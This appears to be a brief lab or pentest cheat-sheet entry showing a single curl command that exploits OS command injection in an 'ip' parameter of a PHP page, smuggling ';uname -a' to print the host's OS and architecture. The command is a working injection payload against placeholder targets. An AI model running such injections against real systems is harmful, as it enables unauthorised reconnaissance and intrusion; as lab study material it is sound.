# Curl

### This will print the OS and architecture of the web application host.
```
curl http://<IP>/<Subdirectory>/example1.php?ip=";uname%20-a" 2>&1 | awk '/<pre>/{flag=1;next}/pre>/{flag=0}flag'
```
